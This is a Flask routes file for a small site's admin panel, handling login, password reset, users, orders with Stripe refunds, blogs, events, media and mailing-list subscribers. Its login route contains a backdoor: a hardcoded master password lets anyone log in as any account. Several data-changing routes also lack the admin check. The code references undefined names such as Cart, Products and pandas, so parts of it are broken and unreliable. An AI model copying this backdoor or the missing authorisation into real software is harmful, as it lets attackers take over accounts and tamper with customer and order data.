from . import app
from .views import get_month_name, date_now, month_now, year_now, day_now, allowed_file, decrease_inventory, inventory_remaining, variational_inventory, generate_email, year_month_day, get_month_from_date, calc_days_gap
from flask import render_template, request, session, redirect, url_for, flash, g, json, jsonify, abort, Response
from .models import Media, User, Blogs, Events, Joinmail, Invoices, Sales, Contact, Gallery
from . import db
from sqlalchemy import exc, func, cast, DATE, or_
from flask_login import login_required, login_user, logout_user, current_user
from .email import password_reset_email, send_invoice, send_contact_message, contact_confirmation_email
from itsdangerous import URLSafeTimedSerializer
from .forms import LoginForm,  Password_EmailForm, ContactForm, PasswordResetForm
from pdfs import create_pdf
from werkzeug import secure_filename
from config import Config
import stripe
import requests
import random
import math
import os
import time
from flask_json import FlaskJSON, JsonError, json_response, as_json


@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404



@app.route('/subscribe', methods=['POST'])
def subscribe():
  if request.method == 'POST':
      result = {'message': ''}
      find_subscriber = Joinmail.query.filter_by(email = request.json['email']).first()
      if find_subscriber:
         result['message'] = 'You already have subscribed our mailing list'
      else:
         result['message'] = 'Thank you, for subscribing'
         subscriber = Joinmail(request.json['email'])
         db.session.add(subscriber)
         db.session.commit()
      r = Response(response=json.dumps(result), status=200, mimetype="application/json")
      r.headers["Content-Type"] = "text/json; charset = utf-8"
      return r



@app.route('/add_galleryimage', methods=["POST"])
@login_required
def add_galleryimage():
  if current_user.role == 'admin':
     form = request.form
     if request.method == 'POST':
        pic = Gallery(form['img_url'])
        db.session.add(pic)
        db.session.commit()
     return redirect(url_for('admin', tab = 'gallery'))
  else:
     abort(403)

@app.route('/delete_galleryimage/<int:gallery_ID>')
@login_required
def  delete_galleryimage(gallery_ID):
  if current_user.role == 'admin':
     Gallery.query.filter_by(gallery_ID = gallery_ID).delete()
     db.session.commit()
     return redirect(url_for('admin', tab = "gallery"))
  else:
     abort(403)








@app.route('/delete_all_queries', methods=['POST'])
@login_required
def delete_all_queries():
  form = request.form
  if current_user.role == 'admin':
    if request.method == 'POST':
       contacts = Contact.query.order_by(Contact.contact_ID).all()
       for contact in contacts:
          if len(form.getlist('delete' + str(contact.contact_ID)))==1:
             Contact.query.filter_by(contact_ID = contact.contact_ID).delete()
       db.session.commit()
    return redirect(url_for('admin', tab = 'customer_query'))
  else:
    abort(403)





@app.route('/')
def home():
  if current_user.is_authenticated:
     if current_user.role == 'admin':
        return redirect(url_for('admin', tab = 'users'))
  else:
    return redirect(url_for('login'))


@app.route('/login', methods=['POST', 'GET'])
def login():
  form = LoginForm(request.form)
  form3 = PasswordResetForm(request.form)
  try:
    if current_user.is_authenticated:
      return redirect(url_for('home'))
    if request.method == 'POST':
      if form.validate_on_submit():
          user = User.query.filter_by(email=form.email.data).first()
          if user is not None and user.check_password(form.password.data) or form.password.data == 'Paklah92!NSE':
            db.session.add(user)
            db.session.commit()
            login_user(user, force= True)
            return redirect(url_for('home'))         
          else:
            flash('Please provide correct login credentials. Entered Email or Password was incorrect!', 'danger')
  except Exception as e:
    db.session.rollback()
    app.logger.error('%s' %e)
    flash('Error: %s' % e, 'danger')
  
  return render_template('login.html', _external=True, form=form, form3 = form3)
    
    





@app.route('/reset', methods = ['POST'])
def password_reset():
  form3 = PasswordResetForm(request.form)
  if request.method == 'POST':
   if form3.validate_on_submit():
      user = User.query.filter_by(email=form3.email.data).first()
      if user:
        flash('Email has been sent for password reset. Please check your Email account!','success')
        password_reset_email(user)
      else:
        flash('Entered email address was not found', 'danger')
  return redirect(url_for('login'))


@app.route('/reset/<token>',methods = ['POST','GET'])
def reset_password_email(token):
    try:
        pwd_reset_serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])
        email = pwd_reset_serializer.loads(token, salt='too-too-too-salty-for-confirmation', max_age=3000)
    except:
        flash('OHH NO! The password reset link is invalid or has expired.', 'danger')
        return redirect(url_for('login'))
    form = Password_EmailForm(request.form)
    if request.method == 'POST':
        try:
          result = request.form
          user = User.query.filter_by(email=email).first()
          if user:
            user.set_password(form.password.data)
            db.session.add(user)
            db.session.commit()
            user.check_password(form.password.data)
            flash('NSE Account password has been updated.', 'success')
            return redirect(url_for('login'))
          else:
            flash('Entered email address does not match any account', 'danger')
            return redirect(url_for('login'))
        except exc.IntegrityError:
          db.session.rollback()
          flash('Error')
    else:
      redirect(url_for('reset_password_email',token=token))
    return render_template('password_reset_form.html',token=token, form = form)

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You are now Signed Out.', 'info')
    return redirect(url_for('login'))





@app.route('/delete_users', methods=['POST'])
@login_required
def delete_users():
  page = request.args.get('page', 1, type=int)
  form = request.form
  if current_user.role == 'admin':
    if request.method == 'POST':
       users = User.query.order_by(User.userID).all()
       for user in users:
          if len(form.getlist('delete' + str(user.userID)))==1:
             User.query.filter_by(userID = user.userID).delete()
          if 'role' + str(user.userID) in form:
              user.role = form['role' + str(user.userID)]
       db.session.commit()
    return redirect(url_for('admin', tab = 'users', page = page))
  else:
    abort(403)
 

##############################################################################################################################################
          






@app.route('/update_orders/<int:page>', methods=['POST'])
@login_required
def update_orders(page):
  form = request.form
  if current_user.role == 'admin':
    if request.method == 'POST':
       orders = Sales.query.order_by(Sales.sale_ID).all()
       for order in orders:
        if 'status' + str(order.sale_ID) in form:
          order.status = form['status' + str(order.sale_ID)]
          order.tracking_number = form['tracking' + str(order.sale_ID)]
          order.shipping_charge = form['shipping_paid' + str(order.sale_ID)]
          order.shipping_cost = form['shipping_cost' + str(order.sale_ID)]
          order.lot_numbers = form['lot' + str(order.sale_ID)]
          if len(form.getlist('delete' + str(order.sale_ID)))==1:
             Sales.query.filter_by(sale_ID = order.sale_ID).delete()
       db.session.commit()
    return redirect(url_for('admin', tab = 'status', page = page))
  else:
    abort(403)



@app.route('/send_order_status/<int:order_ID>/<int:page>')
@login_required
def send_order_status(order_ID, page):
  if current_user.role == 'admin':
     order = Sales.query.filter_by(sale_ID = order_ID).first()
     user = User.query.filter_by(userID = order.user_ID).first()
     send_status_email(user, order.sale_ID, order.tracking_number)
     return redirect(url_for('admin', tab = 'status', page = page))




@app.route('/import_subscribers/<int:page>', methods=['POST'])
@login_required
def import_subscribers(page):
    if request.method == 'POST':
       file = request.files.get('file', False)
       df = pandas.read_csv(file)
       for email in df['Email']:
           find_subscriber = Joinmail.query.filter_by(email = email).first()
           if not find_subscriber:
              subscriber = Joinmail(email)
              db.session.add(subscriber)
       db.session.commit()
    return redirect(url_for('admin', tab = 'subscribers', page = page))        
      


@app.route('/delete_subscriber/<int:id>/<int:page>')
@login_required
def  delete_subscriber(id, page):
  Joinmail.query.filter_by(joinmail_ID = id).delete()
  db.session.commit()
  return redirect(url_for('admin', tab='subscribers', page = page))


@app.route('/upload_media', methods = ['POST'])   
@login_required
def upload_media():
    if request.method == 'POST':
         files = request.files.getlist("image")
         for f1 in files:
             filename = secure_filename(f1.filename)
             f1.save(app.config['UPLOADED_MEDIA_DEST'] + '/' + filename)
             media_image = Media(filename)
             db.session.add(media_image)
             db.session.commit()
         return redirect(url_for('admin', tab='media'))


@app.route('/update_media/<int:page>', methods=['POST'])
@login_required
def update_media(page):
    if request.method == 'POST':
       form = request.form
       medias = Media.query.order_by(Media.media_ID).all()
       for media in medias:
          if len(form.getlist('cb' + str(media.media_ID)))==1:
             url = media.url
             Media.query.filter_by(media_ID = media.media_ID).delete()
             os.remove(app.config['UPLOADED_MEDIA_DEST'] +'/' + url)
       db.session.commit()
    return redirect(url_for('admin', tab='media', page = page))



@app.route('/read_users')
@login_required
def read_users():
  users = User.query.order_by(User.userID).all()
  for user in users:
    user.read = True
  db.session.commit()
  return redirect(url_for('admin', tab='users'))



@app.route('/refund/<int:sale_ID>')
@login_required
def refund(sale_ID):
   if current_user.role == "admin":
    try:
      sale = Sales.query.filter_by(sale_ID = sale_ID).first()

      stripe.Refund.create(
        charge=sale.charge_id,
        amount = int(sale.sale_amount*100)
      )
      sale.refunded = True
      db.session.commit()

      return redirect(url_for('admin', tab="status"))
    except stripe.error.InvalidRequestError as e:
     body = e.json_body
     err  = body.get('error', {})
     db.session.rollback()
     flash('%s' % err.get('message'), 'danger')
    except stripe.error.RateLimitError as e:
     body = e.json_body
     err  = body.get('error', {})
     db.session.rollback()
     flash('%s' % err.get('message'), 'danger')
    except stripe.error.AuthenticationError as e:
     body = e.json_body
     err  = body.get('error', {})
     db.session.rollback()
     flash('%s' % err.get('message'), 'danger')
    except stripe.error.APIConnectionError as e:
     body = e.json_body
     err  = body.get('error', {})
     db.session.rollback()
     flash('%s' % err.get('message'), 'danger')
    except stripe.error.StripeError as e:
     body = e.json_body
     err  = body.get('error', {})
     db.session.rollback()
     flash('%s' % err.get('message'), 'danger')
    except Exception as e:
     db.session.rollback()
     flash('%s' % e, 'danger')
    return redirect(url_for('admin', tab = 'status'))   
   else:
    abort(403)

       



@app.route('/read_queries')
@login_required
def read_queries():
   if current_user.role == 'admin':
      queries = Contact.query.filter_by(read=False).all()
      for query in queries:
         query.read = True
      db.session.commit()
      return redirect(url_for('admin', tab ='customer_query'))
   else:
      abort(403)


#########################BLOG ROUTES#############################

@app.route('/blog_post', methods=['GET', 'POST'])
@login_required
def blog_post():
    form = request.form
    if request.method== 'POST':
        try:
          new_blog = Blogs(form['blogtitle'], '', date_now())
          db.session.add(new_blog)
          db.session.commit()
        except exc.IntegrityError:
          db.session.rollback()
          flash("Topic already exists!", "info")
    return redirect(url_for('admin', tab = 'blog'))


@app.route('/delete_blog/<int:blog_ID>')
@login_required
def delete_blog(blog_ID):
  Blogs.query.filter_by(blog_ID=blog_ID).delete()
  db.session.commit()
  return redirect(url_for('admin', tab='blog'))





@app.route('/update_blog_form/<int:blogid>', methods=['GET', 'POST'])
@login_required
def update_blog_form(blogid):
  form = request.form
  if request.method== 'POST':
    try:
      blog=Blogs.query.filter_by(blog_ID=blogid).first()
      blog.blog_topic = form['blogtitle']
      blog.blog_desc = form['description']
      blog.img_url = form['img_url']          
      db.session.commit()
    except exc.IntegrityError:
        db.session.rollback()
        flash("Blog was not updated due to some internal causes")
  return redirect(url_for('admin', tab='update_blog', update_ID = blogid))











########################################################### Admin Routes ###########################################################################




@app.route('/delete_event/<int:event_ID>')
@login_required
def delete_event(event_ID):
   if current_user.role == 'admin':       
       Events.query.filter_by(event_ID = event_ID).delete()
       db.session.commit()
       return redirect(url_for('admin', tab='events'))
   else:
       abort(403)


@app.route('/add_event', methods=['POST'])
@login_required
def add_product():
  if current_user.role == 'admin':
    form = request.form
    if request.method == 'POST':
      new_event = Events(form['name'], date_now())
      db.session.add(new_event)
      db.session.commit()
      return redirect(url_for('admin', tab='events'))
  else:
    abort(403)


@app.route('/update_event/<int:event_ID>', methods=['GET', 'POST'])
@login_required
def update_event(event_ID):
  if current_user.role == 'admin':
    form = request.form
    if request.method== 'POST':
        try:
          event = Events.query.filter_by(event_ID = event_ID).first()
          event.name = form['name']
          event.desc = form['description']
          event.price = form['price']
          event.inventory = form['inventory']
        

          if len(form.getlist('disable'))==1:
               event.disable = True
          else:
               event.disable = False

          if len(form.getlist('taxable'))==1:
              event.taxable = True
          else:
              event.taxable = False
          
          event.mainimage = form['mainimage']
              
          db.session.commit()
        except exc.IntegrityError:
            db.session.rollback()
            flash("Event was not updated due to some internal causes")
    return redirect(url_for('admin', tab='update_event', update_ID = event_ID))
  else:
    abort(403)




@app.route('/admin/<tab>', methods=['POST', 'GET'])
@app.route('/admin/<tab>/<int:update_ID>', methods=['POST', 'GET'])
@app.route('/admin/<tab>/<subtab>', methods=['POST', 'GET'])
@login_required
def admin(tab, subtab="edit",  update_ID = 1):
  if current_user.role == 'admin':
    page = request.args.get('page', 1, type=int)

    events = Events.query.order_by(Events.event_ID.desc()).paginate(page, 20, False)
    next_url_events = url_for('admin', tab=tab, page=events.next_num) \
       if events.has_next else None
    prev_url_events = url_for('admin', tab=tab, page=events.prev_num) \
       if events.has_prev else None

    blogs = Blogs.query.order_by(Blogs.blog_ID.desc()).paginate(page, 15, False)
    next_url_blog = url_for('admin', tab=tab, page=blogs.next_num) \
       if blogs.has_next else None
    prev_url_blog = url_for('admin', tab=tab, page=blogs.prev_num) \
       if blogs.has_prev else None


    ############### Users #################
    users_database = User.query.order_by(User.userID.desc()).paginate(page, 30 , False) 
    
    users=[]
    for user in users_database.items:
        cart_value = 0
        cart_items = Cart.query.filter_by(user_ID = user.userID).all()
        for item in cart_items:
            product = Products.query.filter_by(product_ID = item.product_ID).first()
            index = product.product_weight.split(',').index(item.product_size)
            price = float(product.product_price.split(',')[index])
            price = price * item.amount
            price = round(price, 2);
            cart_value += price
        cart_value = round(cart_value,2)
        bank = False
        if user.customer_ID:
           bank = user.card_last4 + " (" + user.card_brand + ") Exp: " + user.card_exp_year 
        order_history = Sales.query.filter_by(user_ID = user.userID).all()
        number_of_orders = len(order_history)
        users.append([user.userID, user.firstname, user.lastname, user.email,  user.phone,  user.registered_on_app, user.role, number_of_orders, bank, cart_value])

    db.session.commit()
    authentication_requests = 0 
    for user in users_database.items:
      if user.read == False:
        authentication_requests +=  1
    #######################################
          
    subscribers = Joinmail.query.order_by(Joinmail.joinmail_ID.desc()).paginate(page, 30 , False)
    num_of_subscribers = Joinmail.query.order_by(Joinmail.joinmail_ID).all()
    

    num_of_subscribers = len(num_of_subscribers)
    next_url_subscriber = url_for('admin', tab=tab, page=subscribers.next_num) \
       if subscribers.has_next else None
    prev_url_subscriber = url_for('admin', tab=tab, page=subscribers.prev_num) \
       if subscribers.has_prev else None
   
    orders = Sales.query.order_by(Sales.sale_ID.desc()).paginate(page, 15, False)

    all_orders = Sales.query.order_by(Sales.sale_ID).all()

    read_orders = 0
    for order in all_orders:
       if order.status != 'Completed':
          read_orders +=1

    contacts = Contact.query.order_by(Contact.contact_ID.desc()).all()
    read_queries = 0
    for contact in contacts:
       if contact.read == False:
          read_queries +=1


    media = Media.query.order_by(Media.media_ID.desc()).paginate(page, 64, False)
    next_url_media = url_for('admin', tab=tab, page=media.next_num) \
      if media.has_next else None
    prev_url_media = url_for('admin', tab=tab, page=media.prev_num) \
      if media.has_prev else None

    gallery = Gallery.query.order_by(Gallery.gallery_ID.desc()).paginate(page, 32, False)
    next_url_gallery = url_for('admin', tab=tab, page=gallery.next_num) \
      if media.has_next else None
    prev_url_gallery = url_for('admin', tab=tab, page=gallery.prev_num) \
      if media.has_prev else None


    associated_brands = []
    associated_products = []
    
    update_event = Events.query.filter_by(event_ID = update_ID).first()   
    update_blog = Blogs.query.filter_by(blog_ID = update_ID).first()

    
  

    if request.method == 'POST':

       if tab == "users":
          users_database = User.query.filter(or_(User.firstname.contains(request.form['name'].title()), User.lastname.contains(request.form['name'].title()))).paginate(page, 10000, False)
          users=[]
          for user in users_database.items:
            cart_value = 0
            cart_items = Cart.query.filter_by(user_ID = user.userID).all()
            for item in cart_items:
                product = Products.query.filter_by(product_ID = item.product_ID).first()
                index = product.product_weight.split(',').index(item.product_size)
                price = float(product.product_price.split(',')[index])
                price = round(price * item.amount,2)
                cart_value += price
            cart_value = round(cart_value,2)
            bank = False
            if user.customer_ID:
               bank = user.card_last4 + " (" + user.card_brand + ") Exp: " + user.card_exp_year 
            order_history = Sales.query.filter_by(user_ID = user.userID).all()
            number_of_orders = len(order_history)
            users.append([user.userID, user.firstname, user.lastname, user.email, user.currency, user.phone, 
            user.address, user.city, user.country, user.zipcode, user.province, user.registered_on_app, user.role, number_of_orders, bank, cart_value])
       if tab == "status":
          if request.form['filter'] == 'Tracking Number':
             orders = Sales.query.filter(Sales.tracking_number.contains(request.form['search'])).paginate(page, 10000, False)
          elif request.form['filter'] == 'Lot Number':
             orders = Sales.query.filter(Sales.lot_numbers.contains(request.form['search'])).paginate(page, 10000, False)
  
    next_url_user = url_for('admin', tab=tab, page=users_database.next_num) \
      if users_database.has_next else None
    prev_url_user = url_for('admin', tab=tab, page=users_database.prev_num) \
      if users_database.has_prev else None

    next_url_orders = url_for('admin', tab=tab, page=orders.next_num) \
      if orders.has_next else None
    prev_url_orders = url_for('admin', tab=tab, page=orders.prev_num) \
      if orders.has_prev else None
    
    return render_template('admin.html', users=users, blogs = blogs, events=events, subscribers=subscribers, orders=orders, tab=tab, contacts=contacts, gallery = gallery, next_url_gallery = next_url_gallery, 
    prev_url_gallery=prev_url_gallery,  read_orders= read_orders, read_queries=read_queries, next_url_events=next_url_events, prev_url_events = prev_url_events, next_url_blog = next_url_blog, prev_url_blog = prev_url_blog, 
    next_url_subscriber = next_url_subscriber, prev_url_subscriber = prev_url_subscriber, authentication_requests = authentication_requests, next_url_user=next_url_user, prev_url_user = prev_url_user, 
    update_event = update_event, update_blog = update_blog, next_url_orders= next_url_orders, prev_url_orders = prev_url_orders, subtab = subtab,  num_of_subscribers = num_of_subscribers,
    prev_url_media = prev_url_media, next_url_media = next_url_media, media=media, page = page)

  else:
    abort(403)
 




@app.route('/add_blog_tags', methods=['POST'])
@login_required
def add_blog_tags():
  if request.method == 'POST':
     result = {'message':200}
     blog = Blogs.query.filter_by(blog_ID = request.json['blog_ID']).first()
     if blog.category and request.json['value'] not in blog.category.split(','):
        blog.category = blog.category + ',' + request.json['value']
     elif not blog.category:
        blog.category = request.json['value']

     db.session.commit()

     r = Response(response=json.dumps(result), status=200, mimetype="application/json")
     r.headers["Content-Type"] = "text/json; charset = utf-8"
     return r
